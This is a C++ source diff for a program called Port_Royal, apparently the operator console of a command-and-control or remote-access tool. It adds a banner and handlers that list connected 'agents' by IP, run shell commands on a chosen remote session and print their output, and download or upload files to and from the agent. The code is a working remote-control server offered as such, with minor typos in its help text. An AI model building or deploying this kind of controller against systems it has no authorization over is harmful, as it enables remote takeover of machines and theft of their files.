@@ -1,6 +1,7 @@
 #include "Port_Royal.hpp"
 
 #include "../Common/Common.hpp"
+#include "../Common/File.hpp"
 
 #include <string.h>
 #include <sys/types.h>
@@ -15,6 +16,19 @@ Port_Royal::Port_Royal() : m_socket_to_listen(open_port_and_listen()) {}
 
 void Port_Royal::execute() 
 {
+    std::cout << "***************************" << std::endl;
+    std::cout << "** WOLCOME TO PORT ROYAL **" << std::endl;
+    std::cout << "***************************" << std::endl;
+    std::cout << "commands supported:" << std::endl;
+    std::cout << "show: print all the agents ip connected to the server and there session index" << std::endl;
+    std::cout << "\tsyntax: show" << std::endl;
+    std::cout << "run: run shell command on given session and print std out and std error of the command" << std::endl;
+    std::cout << "\tsyntax: [session id] run [command]" << std::endl;
+    std::cout << "download: download file from the remote agent" << std::endl;
+    std::cout << "\tsyntax: [session id] download [src:remote] [dest:local]" << std::endl;
+    std::cout << "upload: upload file to the remote agent" << std::endl;
+    std::cout << "\tsyntax: [session id] download [dst:remote] [src:local]" << std::endl;
+
     std::vector<Client> clients;
     struct pollfd poll_request[2];
     poll_request[0].fd = 0; //stdin
@@ -41,7 +55,21 @@ void Port_Royal::execute()
             }
             else try {
                 int target = std::stoi(command);
-                clients.at(target).send_command(command.substr(command.find(' ') + 1, command.length()));
+                command = command.substr(command.find(' ') + 1);
+                if (command.find("upload") == 0) {
+                    File f(command.substr(command.rfind(' ') + 1));
+                    command.insert(command.rfind(' ') + 1, f.read_whole_file());
+                    std::cout << clients.at(target).send_command(command) << std::endl;
+                }
+                else if (command.find("download") == 0) {
+                    const int temp = command.rfind(' ');
+                    File f(command.substr(temp + 1));
+                    command.erase(temp);
+                    f.write_data(clients.at(target).send_command(command));
+                }
+                else if (command.find("run") == 0) {
+                    std::cout << clients.at(target).send_command(command) << std::endl;
+                }
             }
             catch (const std::exception& ex) {
                 std::cout << "invalid command " << std::endl;
